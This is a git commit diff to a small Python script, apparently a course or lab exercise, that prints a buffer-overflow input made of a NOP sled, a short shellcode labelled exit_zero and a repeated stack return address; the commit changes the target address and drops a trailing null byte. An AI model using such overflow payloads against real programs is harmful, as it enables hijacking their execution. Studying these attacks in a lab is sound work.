5cf446823c008b07bd1b62b5be9c1761d4c29776
Gabriel Cruz <gabs.oficial98@gmail.com>
2018-12-12 11:40:15 -0200

    Add gitignore and edit python file

--- buffer-overflow/generateInput.py
+++ buffer-overflow/generateInput.py
@@ -1,9 +1,9 @@
 
 
-
+0xbfffeed8
 exit_zero = "\xc0\x31\x24\x04\x89\x80\xcd\x90"
-buf_addr = "\xe0\xf2\xff\xbf"
+buf_addr = "\xd8\xfe\xff\xbf"
 nop = "\x90"
 code = exit_zero
 
-print 80*nop + code + buf_addr*350 + '\0'
+print 80*nop + code + buf_addr*350
